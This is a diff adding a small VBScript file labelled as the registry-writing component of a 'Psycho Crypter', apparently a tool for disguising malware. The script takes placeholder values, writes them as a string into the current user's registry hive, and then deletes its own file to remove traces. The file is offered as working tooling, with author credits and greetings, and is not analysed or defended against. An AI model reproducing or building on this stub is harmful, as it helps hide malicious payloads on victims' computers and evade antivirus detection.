@@ -1,0 +1,22 @@
+ '-------------------------------------------
+    'Author: v_B01
+    'Site: dev-point.com/vb
+    'Twitter: @B01Coder
+    'Class Psycho Crypter - Write in Registry
+    'Version: 0.1.0.0
+    'Created: 15/8/2015
+    'Greets to : THE MYSTERIES LEGACY
+    '-------------------------------------------
+
+dim sh, nr, ns, sr
+nr = "%1%"
+ns = "%2%"
+sr = "%3%"
+set sh =WScript.CreateObject("WScript.Shell")
+sh.regwrite "HKEY_CURRENT_USER\Software\" & nr & "\" & ns, sr, "REG_SZ"
+discardScript()    
+    Function discardScript()
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        strScript = Wscript.ScriptFullName
+        objFSO.DeleteFile(strScript)
+    End Function
